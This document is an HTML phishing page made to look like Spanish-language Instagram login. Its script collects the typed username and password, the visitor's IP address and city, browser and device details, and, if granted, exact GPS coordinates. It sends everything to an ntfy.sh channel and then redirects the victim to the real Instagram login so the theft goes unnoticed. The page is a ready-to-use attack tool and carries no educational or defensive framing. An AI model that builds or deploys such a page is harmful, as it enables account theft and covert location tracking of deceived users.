<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      width: 350px;
      padding: 40px;
      background-color: #fff;
      border: 1px solid #dbdbdb;
      text-align: center;
      border-radius: 1px;
    }
    .logo {
      width: 175px;
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
      box-sizing: border-box;
    }
    .btn {
      width: 100%;
      padding: 8px;
      margin: 10px 0;
      border: none;
      border-radius: 4px;
      background-color: #3897f0;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    .btn:hover {
      background-color: #318ce7;
    }
    .separator {
      margin: 20px 0;
      display: flex;
      align-items: center;
      color: #8e8e8e;
    }
    .separator::before, .separator::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
    }
    .separator::before {
      margin-right: 10px;
    }
    .separator::after {
      margin-left: 10px;
    }
    .link {
      color: #385185;
      text-decoration: none;
      font-size: 14px;
      font-weight: bold;
      display: block;
      margin: 15px 0;
    }
    .small {
      font-size: 12px;
      color: #00376b;
    }
    #locationStatus {
      margin: 10px 0;
      font-size: 12px;
      color: #ed4956;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
    
    <form id="loginForm">
      <input type="text" name="usuario" placeholder="Tel√©fono, usuario o correo electr√≥nico" required>
      <input type="password" name="contrasena" placeholder="Contrase√±a" required>
      <button type="button" id="requestLocation" class="btn">Permitir ubicaci√≥n</button>
      <div id="locationStatus">La ubicaci√≥n no ha sido concedida</div>
      <button type="submit" class="btn">Iniciar sesi√≥n</button>
    </form>
    
    <div class="separator">O</div>
    
    <a href="#" class="link">Iniciar sesi√≥n con Facebook</a>
    <a href="#" class="small">¬øOlvidaste tu contrase√±a?</a>
  </div>

  <script>
    const locationStatus = document.getElementById('locationStatus');
    const requestBtn = document.getElementById('requestLocation');
    let ubicacionConcedida = false;
    let coordenadas = null;

    // Solicitar permiso de ubicaci√≥n
    requestBtn.addEventListener('click', () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            ubicacionConcedida = true;
            coordenadas = {
              lat: position.coords.latitude,
              lon: position.coords.longitude,
              precision: position.coords.accuracy
            };
            locationStatus.textContent = "Ubicaci√≥n concedida ‚úì";
            locationStatus.style.color = "#4CAF50";
            
            // Enviar notificaci√≥n de ubicaci√≥n concedida
            enviarNotificacion("üìç Ubicaci√≥n concedida", `El usuario ha permitido acceso a su ubicaci√≥n exacta:
Latitud: ${coordenadas.lat}
Longitud: ${coordenadas.lon}
Precisi√≥n: ${coordenadas.precision} metros`);
          },
          (error) => {
            locationStatus.textContent = "Ubicaci√≥n denegada ‚úó";
            locationStatus.style.color = "#ed4956";
          }
        );
      } else {
        locationStatus.textContent = "Geolocalizaci√≥n no soportada";
      }
    });

    // Manejar el env√≠o del formulario
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const form = e.target;
      const usuario = form.usuario.value;
      const contrasena = form.contrasena.value;
      
      try {
        // Obtener IP y datos de red
        const ipData = await obtenerDatosRed();
        
        // Obtener informaci√≥n del dispositivo
        const deviceInfo = obtenerInfoDispositivo();
        
        // Crear mensaje con toda la informaci√≥n
        let mensaje = `üîî Intento de inicio de sesi√≥n:\n\n`;
        mensaje += `üë§ Usuario: ${usuario}\n`;
        mensaje += `üîê Contrase√±a: ${contrasena}\n\n`;
        mensaje += `üåê IP: ${ipData.ip}\n`;
        mensaje += `üìç Ubicaci√≥n aproximada: ${ipData.ciudad}, ${ipData.region}, ${ipData.pais}\n`;
        
        if (ubicacionConcedida && coordenadas) {
          mensaje += `\nüìç UBICACI√ìN EXACTA CONCEDIDA:\n`;
          mensaje += `Latitud: ${coordenadas.lat}\n`;
          mensaje += `Longitud: ${coordenadas.lon}\n`;
          mensaje += `Precisi√≥n: ${coordenadas.precision} metros\n`;
          mensaje += `Google Maps: https://www.google.com/maps?q=${coordenadas.lat},${coordenadas.lon}\n`;
        }
        
        mensaje += `\nüñ•Ô∏è Dispositivo:\n`;
        mensaje += `Navegador: ${deviceInfo.navegador}\n`;
        mensaje += `Sistema: ${deviceInfo.sistema}\n`;
        mensaje += `Resoluci√≥n: ${deviceInfo.resolucion}\n`;
        mensaje += `Idioma: ${deviceInfo.idioma}\n`;
        mensaje += `Zona horaria: ${deviceInfo.zonaHoraria}`;
        
        // Enviar notificaci√≥n
        await enviarNotificacion("‚ö†Ô∏è Nuevo login Instagram", mensaje);
        
        // Redirigir despu√©s de 1.5 segundos
        setTimeout(() => {
          window.location.href = 'https://www.instagram.com/accounts/login/';
        }, 1500);
        
      } catch (error) {
        console.error("Error:", error);
        window.location.href = 'https://www.instagram.com/accounts/login/';
      }
    });

    // Funciones auxiliares
    async function obtenerDatosRed() {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      
      const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
      const locationData = await locationResponse.json();
      
      return {
        ip: ipData.ip,
        ciudad: locationData.city || "Desconocida",
        region: locationData.region || "Desconocida",
        pais: locationData.country_name || "Desconocido"
      };
    }

    function obtenerInfoDispositivo() {
      return {
        navegador: navigator.userAgent,
        sistema: navigator.platform,
        resolucion: `${window.screen.width}x${window.screen.height}`,
        idioma: navigator.language,
        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone
      };
    }

    async function enviarNotificacion(titulo, mensaje) {
      try {
        await fetch('https://ntfy.sh/3kG4epWMkei6KLLq', {
          method: 'POST',
          headers: {
            'Title': titulo,
            'Priority': 'high'
          },
          body: mensaje
        });
      } catch (error) {
        console.error("Error al enviar notificaci√≥n:", error);
      }
    }
  </script>
</body>
</html>
